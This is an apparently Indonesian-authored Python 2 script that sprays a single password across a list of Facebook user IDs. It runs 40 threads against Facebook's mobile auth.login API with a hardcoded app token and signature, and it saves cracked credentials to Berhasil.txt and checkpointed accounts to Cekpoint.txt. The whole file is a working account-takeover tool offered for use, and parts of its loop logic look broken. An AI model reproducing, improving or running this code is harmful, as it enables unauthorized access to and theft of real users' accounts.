try:
	import mechanize
	from multiprocessing.pool import ThreadPool
	import os, requests, sys, json, time, hashlib, random
	import sys, datetime, re, threading, getpass, urllib
	from requests.exceptions import ConnectionError
	from mechanize import Browser
except Exception as a:
	exit("</> Error [ %s ]"%(a))
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
back = 0
threads = []
berhasil = []
cekpoint = []
gagal = []
idteman = []
idfromteman = []
idmem = []
id = []
em = []
emfromteman = []
hp = []
hpfromteman = []
reaksi = []
reaksigrup = []
komen = []
komengrup = []
listgrup = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'
def scrak():
    global back
    global berhasil
    global cekpoint
    global gagal
    global up
    try:
        buka = open(idlist, 'r')
        up = buka.read().split()
        while file:
            username = file.readline().strip()
            len(username)
            url = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + username + '&locale=en_US&password=' + passw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
            data = urllib.urlopen(url)
            mpsh = json.load(data)
            if back == len(up):
                break
            if 'access_token' in mpsh:
                bisa = open('Berhasil.txt', 'w')
                bisa.write(username + ' | ' + passw + '\n')
                bisa.close()
                berhasil.append('\x1b[1;97m[\x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m] ' + username + ' | ' + passw)
                back += 1
            else:
                if 'www.facebook.com' in mpsh['error_msg']:
                    cek = open('Cekpoint.txt', 'w')
                    cek.write(username + ' | ' + passw + '\n')
                    cek.close()
                    cekpoint.append('\x1b[1;97m[\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + username + ' | ' + passw)
                    back += 1
                else:
                    gagal.append(username)
                    back += 1
            sys.stdout.write('\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\xb8\x1b[1;91m] \x1b[1;92mCrack    \x1b[1;91m:\x1b[1;97m ' + str(back) + ' \x1b[1;96m>\x1b[1;97m ' + str(len(up)) + ' =>\x1b[1;92mLive\x1b[1;91m:\x1b[1;96m' + str(len(berhasil)) + ' \x1b[1;97m=>\x1b[1;93mCheck\x1b[1;91m:\x1b[1;96m' + str(len(cekpoint)))
            sys.stdout.flush()

    except IOError:
        print '\n\x1b[1;91m[!] Koneksi terganggu'
        time.sleep(1)
    except requests.exceptions.ConnectionError:
        print '\x1b[1;91m[\xe2\x9c\x96] Tidak ada koneksi'
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.1)
def crack():
    global file
    global idlist
    global passw
    os.system('reset')
    idlist = raw_input('\x1b[1;91m[+] \x1b[1;92mFile ID  \x1b[1;91m: \x1b[1;97m')
    pass_tot = open(idlist,"r")
    pass_tot = pass_tot.readlines()
    print "Jumlah ", len(pass_tot)
    passw = raw_input('\x1b[1;91m[+] \x1b[1;92mPassword \x1b[1;91m: \x1b[1;97m')
    file = open(idlist, 'r')
    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;97m...')
    for x in range(40):
    	zedd = threading.Thread(target=scrak, args=())
    	zedd.start()
    	threads.append(zedd)
    for zedd in threads:
    	zedd.join()
crack()